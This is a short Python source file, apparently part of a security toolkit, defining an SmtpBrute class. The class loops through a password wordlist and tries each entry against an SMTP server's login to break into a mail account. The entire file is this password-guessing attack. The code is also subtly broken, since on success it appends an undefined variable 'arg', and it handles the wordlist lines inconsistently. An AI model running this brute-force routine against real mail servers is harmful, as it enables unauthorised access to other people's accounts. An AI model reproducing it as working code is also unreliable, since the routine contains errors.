#!/usr/bin/env python
# -*- coding: utf-8 -*-

import smtplib

from saker.brute.brute import Brute


class SmtpBrute(Brute):

    def __init__(self, smtpServer, passwords):
        super(SmtpBrute, self).__init__()
        self.smtpServer = smtpServer
        self.passwords = passwords

    def do(self, user, res):
        if len(res) > 0:
            return
        with open(self.passwords, "rb") as fh:
            for pwd in fh:
                server = smtplib.SMTP(self.smtpServer)
                try:
                    server.login(user, pwd.strip("\n"))
                    res.append(arg)
                    return True
                except smtplib.SMTPAuthenticationError:
                    pass

        return False
